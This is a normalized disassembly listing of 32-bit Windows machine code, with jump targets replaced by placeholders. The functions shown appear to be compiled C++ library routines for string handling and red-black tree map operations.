lea eax [ esi + 0x1 ]
push 0x0
push eax
call sub_404745
pop ecx
pop ecx
mov ebx eax
jmp r-xdata
push 0xfffffffe
pop eax
sub eax edx
cmp ecx eax
ja r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
lea esi [ edx + ecx ]
push 0x0
push 0x1
mov ecx edi
call sub_40415f
push [ ebp + 0xc ]
mov ecx edi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x18 ] esi
call sub_404490
call sub_425e4c
retn 0x8
cmp [ edi + 0x18 ] 0x10
jb r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
push eax
lea eax [ esi + 0x1 ]
push eax
push ebx
call sub_40102d
add esp 0x10
sub_404646
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x8 ] eax
inc eax
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
call sub_404745
pop ecx
mov [ ebp - 0x14 ] eax
pop ecx
mov eax r-xdata
retn
sub_4046cd
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
xor al al
mov esi [ ecx + 0x18 ]
lea eax [ ecx + 0x4 ]
cmp esi 0x10
jb r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
cmp esi 0x10
jb r-xdata
cmp [ esp + 0x8 ] edx
jb r-xdata
mov ecx [ ecx + 0x14 ]
add ecx eax
cmp ecx [ esp + 0x8 ]
jbe r-xdata
mov eax [ eax ]
mov al 0x1
jmp r-xdata
pop esi
retn 0x4
sub_404708
and [ edi ] 0x0
test esi esi
je r-xdata
call sub_423d5c
test ebx ebx
je r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edx 0x10
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
add ecx eax
cmp ebx ecx
jbe r-xdata
mov eax [ eax ]
mov [ edi ] esi
mov [ edi + 0x4 ] ebx
mov eax edi
retn
sub_404745
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x1
jae r-xdata
xor ecx ecx
push ecx
call sub_4246c6
pop ecx
leave
retn
and [ ebp + 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_423801
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_42597b
int3
sub_4047a7
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ecx
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esp + 0x1c ]
push [ ebp + 0x8 ]
call sub_4047d3
mov esp ebp
pop ebp
retn 0x1c
sub_4047d3
push 0x14
mov eax sub_43c776
call sub_425de0
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
call sub_425e4c
retn 0x20
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_40f2a9
mov edi [ ebp + 0x8 ]
push eax
call sub_4041aa
call sub_408d54
jmp r-xdata
lea edi [ ebp + 0x20 ]
lea esi [ ebp + 0x18 ]
call sub_41ea56
test al al
je r-xdata
sub_404875
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x10 ]
lea esi [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
call sub_408d54
cmp edi [ ebx + 0x14 ]
je r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebx ]
pop edi
mov [ eax ] ecx
pop esi
leave
retn 0xc
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
mov [ eax ] ecx
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
push 0x0
mov [ eax + 0x4 ] ecx
push 0x1
lea ecx [ edi + 0x8 ]
call sub_40415f
push edi
call sub_42412e
dec [ ebx + 0x18 ]
pop ecx
sub_404957
push esi
mov esi edi
call sub_403dae
lea esi [ edi + 0x1c ]
call sub_403dae
lea esi [ edi + 0x38 ]
call sub_403dae
lea esi [ edi + 0x54 ]
call sub_403dae
lea esi [ edi + 0x70 ]
call sub_403dae
lea esi [ edi + 0x8c ]
call sub_403dae
mov eax edi
pop esi
retn
sub_4049dd
push ebx
push edi
push 0xffffffff
xor ebx ebx
mov edi eax
push ebx
push edi
mov ecx esi
call sub_40400a
push 0xffffffff
push ebx
lea eax [ edi + 0x1c ]
push eax
lea ecx [ esi + 0x1c ]
call sub_40400a
push 0xffffffff
push ebx
lea eax [ edi + 0x38 ]
push eax
lea ecx [ esi + 0x38 ]
call sub_40400a
push 0xffffffff
push ebx
lea eax [ edi + 0x54 ]
push eax
lea ecx [ esi + 0x54 ]
call sub_40400a
push 0xffffffff
push ebx
lea eax [ edi + 0x70 ]
push eax
lea ecx [ esi + 0x70 ]
call sub_40400a
push 0xffffffff
push ebx
add edi 0x8c
push edi
lea ecx [ esi + 0x8c ]
call sub_40400a
pop edi
mov eax esi
pop ebx
retn
sub_404a49
push 0x0
push 0x1
lea ecx [ esi + 0x38 ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ esi + 0x1c ]
call sub_40415f
push 0x0
push 0x1
mov ecx esi
call sub_40415f
retn
sub_404a6d
push 0x0
mov eax sub_43bffe
call sub_425dad
mov esi [ ebp + 0x8 ]
push 0x4
call sub_4246c6
pop ecx
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
and [ ebp - 0x4 ] 0x0
call sub_404f5e
mov eax esi
call sub_425e4c
retn 0x4
sub_404aa3
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43c75b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x6c
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x78 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x8 ]
mov eax ebx
call sub_40545f
mov [ esp + 0x14 ] eax
test ebx ebx
jne r-xdata
mov eax [ ebx ]
mov ecx [ ebx + 0x18 ]
lea edi [ esp + 0x18 ]
lea esi [ esp + 0x10 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x1c ] ecx
mov [ esp + 0x18 ] eax
call sub_40f543
test al al
jne r-xdata
call sub_423d5c
xor esi esi
push esi
lea ecx [ esp + 0x24 ]
mov [ esp + 0x3c ] 0xf
call sub_404490
push [ ebp + 0x8 ]
lea ecx [ esp + 0x40 ]
mov [ esp + 0x84 ] esi
call sub_403de3
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x5c ]
mov [ esp + 0x84 ] 0x1
call sub_403de3
mov [ esp + 0x80 ] 0x2
push [ esp + 0x14 ]
lea eax [ esp + 0x40 ]
push [ esp + 0x14 ]
push eax
lea eax [ esp + 0x24 ]
push eax
mov eax ebx
call sub_404d16
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push esi
mov [ esp + 0x14 ] ecx
push 0x1
lea ecx [ esp + 0x60 ]
mov [ esp + 0x1c ] eax
call sub_40415f
push esi
push 0x1
lea ecx [ esp + 0x44 ]
call sub_40415f
push esi
push 0x1
lea ecx [ esp + 0x28 ]
call sub_40415f
mov ecx [ esp + 0x14 ]
mov eax [ ebp + 0x8 ]
add ecx 0xc
call sub_405664
test al al
je r-xdata
lea esi [ esp + 0x10 ]
call sub_40f2d4
add eax 0x1c
mov ecx [ esp + 0x78 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_404bf5
push ebp
mov ebp esp
sub esp 0x18
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
push edi
mov edi [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
cmp [ edi + 0x45 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
lea ecx [ edi + 0xc ]
mov [ ebp - 0x4 ] edi
call sub_405664
mov [ ebp - 0x8 ] al
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi [ ebp - 0x4 ]
mov eax [ esi ]
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] eax
je r-xdata
mov edi [ edi + 0x8 ]
mov edi [ edi ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
lea eax [ edi + 0xc ]
call sub_405664
test al al
je r-xdata
mov ecx [ esi + 0x18 ]
mov ecx [ ecx ]
lea edi [ ebp - 0x18 ]
lea esi [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] eax
call sub_40f543
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
jmp r-xdata
lea esi [ ebp - 0x10 ]
call sub_40552c
mov edi [ ebp - 0xc ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x1
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_404f7f
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebx ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
pop edi
mov eax ebx
pop esi
leave
retn 0x8
sub_404ccb
mov ecx [ eax + 0x14 ]
cmp ecx edx
jae r-xdata
mov ecx edx
cmp edx ebx
jb r-xdata
mov edx ecx
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov ecx ebx
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
push esi
push edi
mov edi [ esp + 0xc ]
mov esi eax
xor eax eax
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
retn 0x4
cmp edx ebx
jae r-xdata
xor eax eax
cmp edx ebx
setne al
or eax 0xffffffff
jmp r-xdata
sub_404d16
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx eax
xor eax eax
push esi
push edi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x1c ] eax
jne r-xdata
mov eax [ ebx + 0x18 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
lea edi [ ebp - 0x10 ]
lea esi [ ebp + 0x10 ]
mov [ ebp - 0x10 ] eax
call sub_40f543
test al al
je r-xdata
mov ecx [ ebx + 0x18 ]
mov eax [ ebx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
lea edi [ ebp - 0x10 ]
lea esi [ ebp + 0x10 ]
mov [ ebp - 0x10 ] eax
call sub_40f543
test al al
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
add ecx 0xc
call sub_405664
test al al
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
mov ecx [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
add ecx 0xc
mov eax edi
call sub_405664
test al al
je r-xdata
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp + 0xc ]
add eax 0xc
call sub_405664
test al al
je r-xdata
push [ ebp + 0xc ]
push ebx
lea ebx [ ebp - 0x14 ]
call sub_404bf5
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
mov ecx [ ebp + 0x14 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
add eax 0xc
mov ecx edi
call sub_405664
test al al
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_40552c
mov eax [ eax + 0x4 ]
add eax 0xc
mov ecx edi
call sub_405664
test al al
je r-xdata
push [ ebp + 0xc ]
mov eax [ ebx + 0x18 ]
mov ecx [ eax + 0x8 ]
push 0x0
jmp r-xdata
push [ ebp + 0xc ]
push 0x1
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
call sub_41325d
lea edi [ ebp - 0x10 ]
mov esi eax
call sub_40f543
test al al
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x45 ] 0x0
push edi
mov esi ebx
je r-xdata
mov esi ebx
mov ecx [ ebp + 0x14 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x45 ] 0x0
push [ ebp + 0xc ]
mov esi ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
add ecx 0xc
call sub_405664
test al al
je r-xdata
mov ecx [ ebp + 0x14 ]
push 0x1
jmp r-xdata
push 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push 0x1
jmp r-xdata
push [ ebp + 0x8 ]
call sub_404f7f
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_404ea8
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
mov eax [ eax ]
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebx ]
push edi
lea edi [ ebp - 0xc ]
lea esi [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
call sub_40f543
test al al
je r-xdata
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_40f543
test al al
je r-xdata
mov eax [ ebx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx ]
lea edi [ ebp - 0xc ]
lea esi [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
call sub_40f543
test al al
je r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea esi [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
call sub_41325d
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push eax
push ebx
call sub_4051bd
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov ebx [ ebx ]
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov eax [ ebx + 0x18 ]
push [ eax + 0x4 ]
mov ecx ebx
call sub_40558d
mov eax [ ebx + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ ebx + 0x18 ]
and [ ebx + 0x1c ] 0x0
mov [ eax ] eax
mov eax [ ebx + 0x18 ]
mov [ eax + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebx ]
mov [ eax ] ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x14
sub_404f7f
push 0x48
mov eax sub_43b0d8
call sub_425dad
mov edi ecx
cmp [ esi + 0x1c ] 0x4924923
jb r-xdata
mov eax [ esi + 0x18 ]
push 0x0
push [ ebp + 0x10 ]
push eax
push edi
push eax
call sub_4054d3
inc [ esi + 0x1c ]
mov ebx eax
mov eax [ esi + 0x18 ]
cmp edi eax
jne r-xdata
push r--data
lea ecx [ ebp - 0x2c ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_401065
push r--data
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x54 ] r--data
call sub_42597b
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ eax + 0x4 ] ebx
mov eax [ esi + 0x18 ]
mov [ eax ] ebx
mov eax [ esi + 0x18 ]
jmp r-xdata
mov [ edi + 0x8 ] ebx
mov eax [ esi + 0x18 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ edi ] ebx
mov eax [ esi + 0x18 ]
cmp edi [ eax ]
jne r-xdata
mov [ eax + 0x8 ] ebx
mov edi ebx
lea eax [ ebx + 0x4 ]
jmp r-xdata
mov [ eax ] ebx
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x44 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ esi ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ecx
call sub_425e4c
retn 0xc
mov edx [ edx ]
cmp [ edx + 0x44 ] 0x0
jne r-xdata
mov edx [ edx + 0x8 ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
cmp edi [ ecx ]
jne r-xdata
mov [ ecx + 0x44 ] 0x1
mov [ edx + 0x44 ] 0x1
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + 0x44 ] 0x0
mov eax [ eax ]
mov edi [ eax + 0x4 ]
jmp r-xdata
cmp edi [ ecx + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x44 ] 0x1
mov eax [ edi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x44 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x4 ]
push esi
call sub_413175
push esi
mov edi ecx
call sub_405491
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
mov [ eax + 0x44 ] 0x1
mov eax [ edi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x44 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x4 ]
push esi
call sub_405491
jmp r-xdata
push esi
mov edi ecx
call sub_413175
sub_4050ce
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ecx
mov eax [ esi + 0x18 ]
mov ecx [ esi ]
mov edx [ eax ]
push eax
push ecx
push edx
push ecx
lea eax [ esp + 0x10 ]
push eax
mov eax esi
call sub_404ea8
push [ esi + 0x18 ]
call sub_42412e
and [ esi + 0x18 ] 0x0
and [ esi + 0x1c ] 0x0
pop ecx
mov esp ebp
pop ebp
retn
sub_405102
mov eax [ edi + 0x14 ]
push ebx
mov ebx [ eax ]
mov [ eax ] eax
mov eax [ edi + 0x14 ]
mov [ eax + 0x4 ] eax
and [ edi + 0x18 ] 0x0
cmp ebx [ edi + 0x14 ]
je r-xdata
push [ edi + 0x14 ]
call sub_42412e
and [ edi + 0x14 ] 0x0
pop ecx
pop ebx
retn
push ebp
push esi
mov ebp [ ebx ]
lea esi [ ebx + 0x8 ]
call sub_404a49
push ebx
call sub_42412e
pop ecx
mov ebx ebp
cmp ebp [ edi + 0x14 ]
jne r-xdata
pop esi
pop ebp
sub_405144
push 0x0
mov eax sub_43aa39
call sub_425dad
mov edi ecx
mov esi [ ebp + 0x8 ]
push edi
mov ecx esi
call sub_403de3
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x1c ]
push eax
lea ecx [ esi + 0x1c ]
call sub_403de3
lea eax [ edi + 0x38 ]
push eax
lea ecx [ esi + 0x38 ]
mov [ ebp - 0x4 ] 0x1
call sub_403de3
lea eax [ edi + 0x54 ]
push eax
lea ecx [ esi + 0x54 ]
mov [ ebp - 0x4 ] 0x2
call sub_403de3
lea eax [ edi + 0x70 ]
push eax
lea ecx [ esi + 0x70 ]
mov [ ebp - 0x4 ] 0x3
call sub_403de3
add edi 0x8c
push edi
lea ecx [ esi + 0x8c ]
mov [ ebp - 0x4 ] 0x4
call sub_403de3
mov eax esi
call sub_425e4c
retn 0x4
sub_4051bd
push 0x4c
mov eax sub_43b016
call sub_425dad
mov ebx [ ebp + 0x14 ]
cmp [ ebx + 0x45 ] 0x0
je r-xdata
lea esi [ ebp + 0x10 ]
call sub_41325d
mov edx [ ebx ]
cmp [ edx + 0x45 ] 0x0
je r-xdata
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x58 ]
call sub_401065
push r--data
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x58 ] r--data
call sub_42597b
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
lea ecx [ eax + 0x8 ]
mov edi [ ecx ]
cmp eax ebx
jne r-xdata
mov edi edx
jmp r-xdata
cmp [ edi + 0x45 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov edx [ ebx ]
mov [ eax ] edx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x18 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x45 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov edx [ ebx + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebx + 0x8 ]
mov [ ecx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x18 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov edx [ ecx + 0x18 ]
cmp [ edx ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x18 ]
cmp [ edx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x45 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov [ eax + 0x4 ] ecx
lea ecx [ ebx + 0x44 ]
add eax 0x44
cmp eax ecx
je r-xdata
cmp [ ebx + 0x44 ] 0x1
jne r-xdata
cmp [ edi + 0x45 ] 0x0
je r-xdata
mov eax [ edi ]
mov ecx edi
jmp r-xdata
mov ecx esi
jmp r-xdata
mov dl [ eax ]
mov [ ebp - 0x11 ] dl
mov dl [ ecx ]
mov [ eax ] dl
mov al [ ebp - 0x11 ]
mov [ ecx ] al
lea esi [ ebx + 0xc ]
call sub_4049b2
push ebx
call sub_42412e
mov eax [ ebp + 0x8 ]
pop ecx
mov ecx [ eax + 0x1c ]
test ecx ecx
jbe r-xdata
jmp r-xdata
mov eax [ edi + 0x8 ]
mov ecx edi
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov [ edx ] ecx
mov edx [ eax ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x14 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
call sub_425e4c
retn 0x10
dec ecx
mov [ eax + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
cmp edi [ eax + 0x4 ]
jne r-xdata
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ edi + 0x44 ] 0x1
jne r-xdata
jmp r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
mov [ edi + 0x44 ] 0x1
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x44 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x44 ] 0x0
jne r-xdata
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
mov [ ecx + 0x44 ] 0x1
mov ecx esi
mov [ esi + 0x44 ] 0x0
call sub_405491
mov ecx [ esi ]
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
mov [ ecx + 0x44 ] 0x1
mov ecx esi
mov [ esi + 0x44 ] 0x0
call sub_413175
mov ecx [ esi + 0x8 ]
mov edi esi
mov esi [ esi + 0x4 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x44 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x44 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x44 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x44 ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x44 ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x44 ] 0x1
je r-xdata
mov al [ esi + 0x44 ]
push [ ebp + 0x8 ]
mov [ ecx + 0x44 ] al
mov [ esi + 0x44 ] 0x1
mov eax [ ecx ]
mov ecx esi
mov [ eax + 0x44 ] 0x1
call sub_405491
mov eax [ ecx + 0x8 ]
push [ ebp + 0x8 ]
mov [ eax + 0x44 ] 0x1
mov [ ecx + 0x44 ] 0x0
call sub_413175
mov ecx [ esi ]
mov [ ecx + 0x44 ] 0x0
mov al [ esi + 0x44 ]
push [ ebp + 0x8 ]
mov [ ecx + 0x44 ] al
mov [ esi + 0x44 ] 0x1
mov eax [ ecx + 0x8 ]
mov ecx esi
mov [ eax + 0x44 ] 0x1
call sub_413175
jmp r-xdata
mov eax [ ecx ]
push [ ebp + 0x8 ]
mov [ eax + 0x44 ] 0x1
mov [ ecx + 0x44 ] 0x0
call sub_405491
mov ecx [ esi + 0x8 ]
sub_40545f
mov eax [ eax + 0x18 ]
push esi
mov esi [ eax + 0x4 ]
push edi
mov edi eax
jmp r-xdata
cmp [ esi + 0x45 ] 0x0
je r-xdata
mov ecx [ esp + 0xc ]
lea eax [ esi + 0xc ]
call sub_405664
test al al
je r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
mov edi esi
mov esi [ esi ]
mov esi [ esi + 0x8 ]
jmp r-xdata
sub_405491
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x45 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov edx [ edx + 0x18 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
jmp r-xdata
mov [ edx ] eax
mov [ edx + 0x8 ] eax
jmp r-xdata
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
sub_4054d3
push 0xc
mov eax sub_43a9ea
call sub_425de0
push 0x48
call sub_4246c6
and [ ebp - 0x4 ] 0x0
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
mov eax esi
call sub_425e4c
retn 0x14
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4055c9
sub_40552c
push ebx
xor ebx ebx
cmp [ esi ] ebx
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x45 ] bl
je r-xdata
call sub_423d5c
mov ecx [ eax ]
cmp [ ecx + 0x45 ] bl
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ esi + 0x4 ] eax
cmp [ eax + 0x45 ] bl
je r-xdata
mov eax [ eax + 0x4 ]
cmp [ eax + 0x45 ] bl
je r-xdata
jmp r-xdata
mov eax esi
pop ebx
retn
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ esi + 0x4 ]
cmp [ ecx + 0x45 ] bl
je r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x45 ] bl
je r-xdata
call sub_423d5c
jmp r-xdata
mov [ esi + 0x4 ] eax
mov [ esi + 0x4 ] eax
mov ecx eax
mov [ esi + 0x4 ] ecx
jmp r-xdata
sub_40558d
push ebx
mov ebx [ esp + 0x8 ]
cmp [ ebx + 0x45 ] 0x0
push ebp
push edi
mov ebp ecx
mov edi ebx
jne r-xdata
pop edi
pop ebp
pop ebx
retn 0x4
push esi
push [ edi + 0x8 ]
mov ecx ebp
call sub_40558d
mov edi [ edi ]
lea esi [ ebx + 0xc ]
call sub_4049b2
push ebx
call sub_42412e
cmp [ edi + 0x45 ] 0x0
pop ecx
mov ebx edi
je r-xdata
pop esi
sub_4055c9
push 0x0
mov eax sub_43a9c1
call sub_425dad
mov ebx ecx
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x10 ]
lea edi [ esi + 0xc ]
push ebx
mov ecx edi
mov [ esi + 0x8 ] eax
mov [ ebp + 0x8 ] edi
call sub_403de3
and [ ebp - 0x4 ] 0x0
add ebx 0x1c
push ebx
lea ecx [ edi + 0x1c ]
call sub_403de3
